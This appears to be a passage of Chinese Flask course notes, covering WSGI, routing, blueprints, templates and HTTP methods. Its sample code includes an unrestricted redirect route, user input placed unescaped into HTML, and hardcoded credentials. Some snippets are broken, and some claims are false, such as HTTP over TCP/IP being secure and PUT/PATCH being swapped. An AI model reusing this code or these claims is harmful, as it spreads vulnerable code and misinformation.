title=\"一、WEB应用服务的认知\"></a>一、WEB应用服务的认知</h2><p>flask开发文档： <a href=\"http://docs.jinkan.org/docs/flask/quickstart.html\">http://docs.jinkan.org/docs/flask/quickstart.html</a></p>\n<p>WEB应用服务基于HTTP协议/规范，实现静态资源和动态资源的请求与处理，静态资源包含html网页、图片、样式、javascript脚本、视频、音频等等。动态资源即通过程序（java/php/python/.net）和数据库（mysql/oracle/sqlsever）根据业务处理流程会动态的生成html，再将html响应给请求（客户端）。</p>\n<p>HTTP(1.0、1.1、2.0)和HTML的关系：</p>\n<p>\\1. 客户端封装Http请求（HttpRequest），向服务端发起请求</p>\n<p>\\2. 服务端接收请求之后，分析资源请求的路径、请求参数（查询参数、表单参数、json/字节流）、请求方法、请求头等。</p>\n<p>\\3. 服务端根据资源的请求路径读取文件的内容，并生成字节码数据且封装响应对象(HttpResponse)</p>\n<p>\\4. 客户端接收服务端的响应数据（HttpResponse），判断请求是否成功，如果成功则显示数据（html/json）。</p>\n<p>WEB应用服务：</p>\n<p>\\1. 客户端（Browser浏览器）发起请求（HttpRequest）</p>\n<p>\\2. 服务端(Apache/Nginx/PythonWeb)接收请求，根据请求的资源信息，读取文件，并封装到响应对象（HttpResponse）中。</p>\n<p>\\3. 客户端接收资源，分析资源的类型然后渲染并显示出来。</p>\n<p>另外，WEB应用服务基于HTTP协议，HTTP协议又基于TCP/IP协议，因此是安全性连接。</p>\n<p>应用层/表示层/会话层/传输层/网络层/数据链路层/物理层</p>\n<h2 id=\"二、Python-Web开发框架\"><a href=\"#二、Python-Web开发框架\" class=\"headerlink\" title=\"二、Python Web开发框架\"></a>二、Python Web开发框架</h2><p>Python本身实现WEB应用服务的接口（规范），便于我们开发动态资源请求。提供的开发模块是wsgiref。此模块是所有其他高级框架中最核心的，最基本的规范，如Flask基于Werkzeug库实现了wsgi通信协议。</p>\n<p>WSGI: Web Server Gataway Interface - WEB服务网关接口，负责http协议的底层通信。</p>\n<p>Python WEB开发框架：Django（组件最全、最强大的框架，主要用于后端服务管理、运维（Ansible/Openstack））；Flask小巧的、灵活的框架、可以快速开发API接口；Tornado是基于协程和单线程单进程的框架实现非阻塞的网络框架。Sanic是性能最优的WEB非阻塞框架。</p>\n<p>Python wsgi 案例：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> wsgiref.simple_server <span class=\"keyword\">import</span> make_server</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">app</span>(<span class=\"params\">enviro, start_response</span>):</span><br><span class=\"line\">\t<span class=\"comment\"># 核心业务</span></span><br><span class=\"line\"><span class=\"comment\"># 生成响应的对象</span></span><br><span class=\"line\">start_response(‘HTTP/<span class=\"number\">1.1</span> <span class=\"number\">200</span> OK’, [(‘content-<span class=\"built_in\">type</span>’, ‘text/html’), ()]) <span class=\"comment\">#响应头</span></span><br><span class=\"line\"><span class=\"keyword\">return</span> [‘&lt;h3&gt;hello, wsgi&lt;/h3&gt;’.encode(‘utf-<span class=\"number\">8</span>’)]</span><br><span class=\"line\"></span><br><span class=\"line\">httpd = make_server(‘<span class=\"number\">0.0</span><span class=\"number\">.0</span><span class=\"number\">.0</span>’, <span class=\"number\">8000</span>, app)</span><br><span class=\"line\">Httpd.serve_forever(poll_interval=<span class=\"number\">0.5</span>)  <span class=\"comment\"># 轮询监听的间隔时间</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>代码分析：</p>\n<p>* make_server() 是创建WEB服务进程</p>\n<p>* app()函数的enviro是environment的简写，表示请求的环境信息，是字典类型。</p>\n<p>* app()函数在返回数据之前，需要生成响应头信息即start_response(‘200 OK’, [(header-key, value)])</p>\n<h2 id=\"三、Flask框架的应用\"><a href=\"#三、Flask框架的应用\" class=\"headerlink\" title=\"三、Flask框架的应用\"></a>三、Flask框架的应用</h2><p>1.1 安装环境</p>\n<p>(apiserver) &gt; pip install flask</p>\n<p>1.2 第一个Flask项目</p>\n<p>创建server2.py脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask</span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> request</span><br><span class=\"line\"><span class=\"comment\"># 创建Flask对象-Httpd WEB服务对象</span></span><br><span class=\"line\">app = Flask(<span class=\"string\">&#x27;hiflask&#x27;</span>) <span class=\"comment\"># __name__可以是任意的小写字母，表示Flask应用对象名称</span></span><br><span class=\"line\"><span class=\"comment\"># 声明WEB服务的请求资源(指定资源访问的路由)（动态的）</span></span><br><span class=\"line\"><span class=\"comment\"># RESTful 设计风格中关于资源的动作：&#x27;GET&#x27;, &#x27;POST&#x27;, &#x27;PUT&#x27;, &#x27;DELETE&#x27;, &#x27;PATCH&#x27;</span></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/hello&#x27;</span>, methods=[<span class=\"string\">&#x27;GET&#x27;</span>, <span class=\"string\">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">hello</span>():</span><br><span class=\"line\">    <span class=\"comment\"># 获取平台参数：platform</span></span><br><span class=\"line\">    <span class=\"comment\"># 只支持Android手机访问</span></span><br><span class=\"line\">    platform = request.args.get(<span class=\"string\">&#x27;platform&#x27;</span>, <span class=\"string\">&#x27;pc&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> platform.lower() != <span class=\"string\">&#x27;android&#x27;</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">            &lt;h2&gt;目前只支持Android设备&lt;/h2&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> request.method == <span class=\"string\">&#x27;GET&#x27;</span>:</span><br><span class=\"line\">    <span class=\"comment\"># request是请求对象(HttpRequest)，它包含请求资源的路径，请求方法，请求头，上传的表单数据，文件等信息。</span></span><br><span class=\"line\">    <span class=\"comment\"># 获取请求中的查询参数（username, password）</span></span><br><span class=\"line\">    <span class=\"comment\"># wsgi -&gt; query_string: username=disen&amp;password=123</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 返回生成的HTML网页内容</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">            &lt;h1&gt;用户登录的信息&lt;/h1&gt; </span></span><br><span class=\"line\"><span class=\"string\">            &lt;form action=&quot;/hello?platform=android&quot; method=&quot;post&quot;&gt;</span></span><br><span class=\"line\"><span class=\"string\">                &lt;input name=&quot;name&quot; placeholder=&quot;用户名&quot;&gt;&lt;br&gt;</span></span><br><span class=\"line\"><span class=\"string\">                &lt;input name=&quot;pwd&quot; placeholder=&quot;口令&quot;&gt;&lt;br&gt;</span></span><br><span class=\"line\"><span class=\"string\">                &lt;button&gt;提交&lt;/button&gt;</span></span><br><span class=\"line\"><span class=\"string\">            &lt;/form&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &quot;&quot;&quot;</span></span><br><span class=\"line\">        <span class=\"comment\"># &lt;h3&gt;用户名：%s &lt;/h3&gt;</span></span><br><span class=\"line\">        <span class=\"comment\"># &lt;h3&gt;口令：%s &lt;/h3&gt;</span></span><br><span class=\"line\">        <span class=\"comment\"># % (name, password)</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"comment\"># 获取表单的参数</span></span><br><span class=\"line\">        name = request.form.get(<span class=\"string\">&#x27;name&#x27;</span>)</span><br><span class=\"line\">        pwd = request.form.get(<span class=\"string\">&#x27;pwd&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">all</span>((</span><br><span class=\"line\">            name.strip() == <span class=\"string\">&#x27;qaz&#x27;</span>,</span><br><span class=\"line\">            pwd.strip() == <span class=\"string\">&#x27;987&#x27;</span></span><br><span class=\"line\">        )):</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">                &lt;h2 style=&quot;color:blue;&quot;&gt;登录成功&lt;/h2&gt;</span></span><br><span class=\"line\"><span class=\"string\">            &quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">                &lt;h2 style=&quot;color:orange;&quot;&gt;登录失败, &lt;a href=&quot;/hello&quot;&gt;重试&lt;/a&gt;&lt;/h2&gt;</span></span><br><span class=\"line\"><span class=\"string\">            &quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 启动flask的WEB服务器</span></span><br><span class=\"line\">app.run(host=<span class=\"string\">&quot;localhost&quot;</span>, port=<span class=\"number\">5000</span>)</span><br></pre></td></tr></table></figure>\n\n<p> 3.3 Flask的MVC设计思想</p>\n<p>\\1. 客户端发起请求之后，通过路由找到视图处理函数</p>\n<p>\\2. 路由（请求资源）和视图处理函数-V(Controller)事先在app中声明</p>\n<p>\\3. 在视图的处理函数中根据业务需求，加载数据(Model)并渲染到模板中(View)</p>\n<p>\\4. 将渲染之后的模板数据返回给客户端。</p>\n<p>3.4 Flask特有MTV设计思想</p>\n<p>MTV设计思想，基于MVC的：</p>\n<p>* M-Model</p>\n<p>* T-Template模板（VIEW）</p>\n<p>* V-View处理函数（Controller）</p>\n<p>**案例分析</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&#x27;/bank&#x27;</span>, methods=[<span class=\"string\">&#x27;GET&#x27;</span>, <span class=\"string\">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">addBank</span>():</span><br><span class=\"line\">    <span class=\"comment\"># 加载数据(Model 交互操作)</span></span><br><span class=\"line\">    data = &#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;title&#x27;</span>: <span class=\"string\">&#x27;绑定银行卡&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;error_message&#x27;</span>: <span class=\"string\">&#x27;卡号和银行卡名称不能为空&#x27;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\"># 渲染模板</span></span><br><span class=\"line\">    html = render_template(<span class=\"string\">&#x27;bank_edit.html&#x27;</span>, **data)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> html <span class=\"comment\"># 将数据返回给客户端</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>&#123;&#123; title &#125;&#125;的页面<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">h2</span>&gt;</span>&#123;&#123; title &#125;&#125;的页面<span class=\"tag\">&lt;/<span class=\"name\">h2</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">label</span>&gt;</span>银行名称<span class=\"tag\">&lt;/<span class=\"name\">label</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;name&quot;</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">label</span>&gt;</span>卡号<span class=\"tag\">&lt;/<span class=\"name\">label</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;card_num&quot;</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">button</span>&gt;</span>提交<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;error&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span>&#123;&#123; error_message &#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>以上html文件不是静态的网页文件，而是一个动态的模板文件，页面中存在动态显示的变量。需要在视图函数中，指定数据渲染模板，渲染之后的html内容才是静态资源。</p>\n<p>3.5 app.run()函数的参数</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 启动flask的WEB服务器</span></span><br><span class=\"line\">app.run(<span class=\"string\">&#x27;localhost&#x27;</span>,</span><br><span class=\"line\">        <span class=\"number\">5000</span>,</span><br><span class=\"line\">        <span class=\"literal\">True</span>, <span class=\"comment\"># 默认未开启调试模式，True开启调试模式</span></span><br><span class=\"line\">        threaded=<span class=\"literal\">True</span>,  <span class=\"comment\"># 默认是单线程，即为False</span></span><br><span class=\"line\">        processes=<span class=\"number\">4</span>) <span class=\"comment\"># 默认只有一个进程</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 注意：多进程和多线程不能同时开启，只能选择一种，如processes=4，同时threaded=True则会报错。</span></span><br></pre></td></tr></table></figure>\n\n<p>3.6 请求request和响应response</p>\n<p>3.7 Flask-script插件</p>\n<p>安装包：pip install flask-script</p>\n<p>Flask需用1.1.x版本</p>\n<p>在server.py使用</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> mainapp <span class=\"keyword\">import</span> app</span><br><span class=\"line\"><span class=\"keyword\">from</span> flask_script <span class=\"keyword\">import</span> Manager</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    <span class=\"comment\"># 以脚本的方式启动flask应用服务</span></span><br><span class=\"line\">    manager = Manager(app)</span><br><span class=\"line\">    manager.run()</span><br></pre></td></tr></table></figure>\n\n<p>在命令窗口运行server.py脚本</p>\n<p>Python server.py runserver -d  # debug调试模式</p>\n<p>3.8 flask-blueprint插件</p>\n<p>blueprint插件主要实现拆分多个视图函数，让同类或同一个模块分到一个view的脚本中，如银行系统中，可以分用户模块、银行模块、交易模块等，每一个模块有它自己的view处理函数的脚本。</p>\n<p>安装依赖包</p>\n<p>Pip install flask-blueprint</p>\n<p>在views.bank.py脚本中使用</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Blueprint</span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> request</span><br><span class=\"line\">blue = Blueprint(<span class=\"string\">&#x27;bankBlue&#x27;</span>, __name__)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@blue.route(<span class=\"params\"><span class=\"string\">&#x27;/bank&#x27;</span>, methods=[<span class=\"string\">&#x27;GET&#x27;</span>, <span class=\"string\">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">bank</span>():</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&quot;&lt;h3&gt;hi, Bank-Blue&lt;/h3&gt;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@blue.route(<span class=\"params\"><span class=\"string\">&#x27;/delbank&#x27;</span>, methods=[<span class=\"string\">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">del_bank</span>():</span><br><span class=\"line\">    bank_id = request.args.get(<span class=\"string\">&#x27;id&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&quot;&lt;h3&gt;正在删除银行：%s&lt;/h3&gt;&quot;</span> % bank_id</span><br></pre></td></tr></table></figure>\n\n<p>注意：Blueprint类从flask模块中导入。</p>\n<p>在server.py脚本中注册views.bank.py中的blue蓝图对象。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> mainapp <span class=\"keyword\">import</span> app</span><br><span class=\"line\"><span class=\"keyword\">from</span> mainapp.views <span class=\"keyword\">import</span> bank, user</span><br><span class=\"line\"><span class=\"keyword\">from</span> flask_script <span class=\"keyword\">import</span> Manager</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 将蓝图对象注册到flask服务中</span></span><br><span class=\"line\">    app.register_blueprint(bank.blue)</span><br><span class=\"line\">    app.register_blueprint(user.blue, url_prefix=<span class=\"string\">&#x27;/user&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 以脚本的方式启动flask应用服务</span></span><br><span class=\"line\">    manager = Manager(app)</span><br><span class=\"line\">    manager.run()</span><br></pre></td></tr></table></figure>\n\n<p>另外，在注册蓝图对象时，可以设置蓝图中路由访问的前缀，如:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Blueprint</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 创建蓝图的时候，第一个参数：name可以任意命名，第二个参数：必须使用__name__表示导包的名称</span></span><br><span class=\"line\">blue = Blueprint(<span class=\"string\">&#x27;userBlue&#x27;</span>, __name__)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 声明的API接口</span></span><br><span class=\"line\"><span class=\"meta\">@blue.route(<span class=\"params\"><span class=\"string\">&#x27;/find&#x27;</span>, methods=[<span class=\"string\">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">find</span>():</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&quot;&lt;h2&gt;hi, User - Blueprint&lt;/h2&gt;&quot;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># url_prefix 设置蓝图中子路由的前缀</span></span><br><span class=\"line\">app.register_blueprint(user.blue, url_prefix=<span class=\"string\">&#x27;/user&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>如果要访问user.py中/find路由，全路径时：<a href=\"http://localhost:5000/user/find\">http://localhost:5000/user/find</a>     </p>\n<h1 id=\"WEB服务Flask第二天\"><a href=\"#WEB服务Flask第二天\" class=\"headerlink\" title=\"WEB服务Flask第二天\"></a>WEB服务Flask第二天</h1><h2 id=\"一、路由、request与response\"><a href=\"#一、路由、request与response\" class=\"headerlink\" title=\"一、路由、request与response\"></a>一、路由、request与response</h2><p><strong>1.1</strong> 路由规则</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@blue.route(<span class=\"params\">‘/find’</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">find</span>():</span><br><span class=\"line\">   <span class=\"keyword\">return</span> “”</span><br></pre></td></tr></table></figure>\n\n<p>请求的url是<a href=\"http://localhost:5000/find%E3%80%82%E8%B7%AF%E7%94%B1%E4%B8%AD%E9%85%8D%E7%BD%AE%E7%9A%84%E8%B7%AF%E5%BE%84%E5%8D%B3%E6%98%AF%E8%AF%B7%E6%B1%82%E7%9A%84path%E8%B7%AF%E5%BE%84%E3%80%82\">http://localhost:5000/find。路由中配置的路径即是请求的path路径。</a></p>\n<p>如果使用“蓝图”则在注册时，可以注明它的url前缀。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">app.register_blueprint(bank.blue, url_prefix=”/bank”)</span><br></pre></td></tr></table></figure>\n\n<p>通过url_prefix参数指定某一个模块下的所有请求资源，对于/find路由来说的，应该是/bank的子路径（路由），访问全路径是<a href=\"http://localhost:5000/bank/find%E3%80%82\">http://localhost:5000/bank/find。</a></p>\n<p>1.1.1 <strong>路由中的参数</strong></p>\n<p>语法：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\">‘/find/&lt;converter:word&gt;’, methods=[‘GET’]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">find</span>(<span class=\"params\">word</span>):</span><br><span class=\"line\">   <span class=\"keyword\">return</span> “”</span><br></pre></td></tr></table></figure>\n\n<p>converter是参数的转换器，一般是指定的类型，如string，<strong>int<strong><strong>，float</strong></strong>，path</strong>，uuid，any。</p>\n<p>其中any()比较特殊，可以指定任意的类型转换器，如&lt;any(int,string,uuid):word&gt;，但目前最新的flask版本不支持any()动作，直接写成“/find/<word>”.word表示任意类型。</p>\n<p>另外，path转换器主要用于引用别的网址时使用。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\">‘/forward/&lt;path:url&gt;’</span>)</span></span><br><span class=\"line\">Def forward(url):</span><br><span class=\"line\"><span class=\"comment\">#重定向url</span></span><br><span class=\"line\"><span class=\"keyword\">return</span> redirect(url)</span><br></pre></td></tr></table></figure>\n\n<p>以上的路由配置，对于“/forward/<a href=\"http://www.baidu.com”路径是合法的,如果将path转换器换成string有可能会出错./\">http://www.baidu.com”路径是合法的，如果将path转换器换成string有可能会出错。</a></p>\n<p>另外，path路径中可以接收多个参数。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@blue.route(<span class=\"params\"><span class=\"string\">&#x27;/add/&lt;bankName&gt;/&lt;int:page&gt;&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">addCard</span>(<span class=\"params\">bankName, page</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&quot;%s开户成功！在第 %s 页&quot;</span> % (bankName, page)</span><br></pre></td></tr></table></figure>\n\n<p><strong>1.1.2</strong> <strong>路由的请求方法</strong></p>\n<p>路由中的请求方法是通过methods设置的，且要求是list类型。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@blue.route(<span class=\"params\"><span class=\"string\">&#x27;/find/&lt;keyword&gt;/&#x27;</span>, methods=[<span class=\"string\">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">find</span>(<span class=\"params\">keyword</span>):</span><br><span class=\"line\">    <span class=\"comment\"># keyword有可能是银行的id，名称，地址</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&quot;keyword 是string类型，值是 %s&quot;</span> %(keyword)</span><br></pre></td></tr></table></figure>\n\n<p>上面的注册路由是没有指定methods，默认中包含GET和OPTIONS。</p>\n<p>常见的请求方法：</p>\n<p>*GET查询数据使用，可以上传的参数大小限于1M以内，参数是显示在请求地址中的。</p>\n<p>*POST添加或编辑数据时使用，可以上传超过1G的大数据，且以表单参数的方式上传，并不显示请求地址中，相比于GET，请求参数比较安全且支持大数据或文件。</p>\n<p>*PUT更新数据时使用，局部数据的修改，如修改用户的口令或头像</p>\n<p>*PATCH批量更新数据时使用，整体的数据修改，如修改用户的收货地址、实名认证、绑定银行卡。</p>\n<p>*DELETE删除数据时使用。</p>\n<p>*其他的方法：OPTIONS、HEAD</p>\n<p> 如声明一个处理函数，用于删除银行信息，正确的路由配置如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\">‘/<span class=\"keyword\">del</span>/&lt;<span class=\"built_in\">int</span>:bank_id&gt;’, methods=[“DELETE”]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete4id</span>(<span class=\"params\">bank_id</span>):</span><br><span class=\"line\">Return “删除操作成功！”</span><br></pre></td></tr></table></figure>\n\n<p>针对PUT/DELETE/POST/GET等url接口测试，可以使用requests库。</p>\n<p>Pip install requests</p>\n<p>Requests库中提供相关函数，函数的名称与请求方法是一一对应，当然也可以使用requests.request()方法是最全的方法，其他的函数都是在request()方法之上重新封装的。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">url = <span class=\"string\">&quot;http://localhost:5000/bank/del/100&quot;</span></span><br><span class=\"line\">method=<span class=\"string\">&#x27;DELETE&#x27;</span></span><br><span class=\"line\">resp = requests.request(method, url)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(resp.text)</span><br></pre></td></tr></table></figure>\n\n<p>也可以使用请求方法对应的requests库的相关函数，如：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">url = <span class=\"string\">&quot;http://localhost:5000/bank/del/100&quot;</span></span><br><span class=\"line\">method=<span class=\"string\">&#x27;DELETE&#x27;</span></span><br><span class=\"line\">resp = requests.delete(url)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(resp.text)</span><br></pre></td></tr></table></figure>\n\n\n\n<p><strong>1.1.3</strong> <strong>路由的反向解析</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">From flask <span class=\"keyword\">import</span> url_for</span><br><span class=\"line\">From flask <span class=\"keyword\">import</span> Blueprint</span><br><span class=\"line\"></span><br><span class=\"line\">Blue = Blueprint(‘myBlueName’)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@blue.route(<span class=\"params\">‘/add/&lt;bankName&gt;’</span>)</span></span><br><span class=\"line\">Def add(bankName):</span><br><span class=\"line\">...</span><br><span class=\"line\"><span class=\"meta\">@blue.route(<span class=\"params\">‘/select’</span>)</span></span><br><span class=\"line\">Def select():</span><br><span class=\"line\">Return “&lt;a href=%s&gt;进入下一个页面&lt;/a&gt;” % url_for(‘myBlueName.add’, bankName=”中国银行”)</span><br></pre></td></tr></table></figure>\n\n<p>Url_for(“函数名”， **kwargs)反向解析的是flask的路由注册的路径</p>\n<p>Url_for(“蓝图名.函数名”, **kwargs)反向解析指定蓝图下的路由注册路径。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@blue.route(<span class=\"params\"><span class=\"string\">&#x27;/add/&lt;bankName&gt;/&lt;int:page&gt;&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">addCard</span>(<span class=\"params\">bankName, page</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&quot;&quot;&quot; </span></span><br><span class=\"line\"><span class=\"string\">        %s开户成功！在第 %s 页</span></span><br><span class=\"line\"><span class=\"string\">        &lt;br&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;a href=&quot;%s&quot;&gt;返回首页&lt;/a&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span> % (bankName, page, url_for(<span class=\"string\">&#x27;index&#x27;</span>))</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\"><span class=\"string\">&quot;/&quot;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">index</span>():</span><br><span class=\"line\">    <span class=\"keyword\">return</span>  <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;ul&gt;</span></span><br><span class=\"line\"><span class=\"string\">            &lt;li&gt;&lt;a 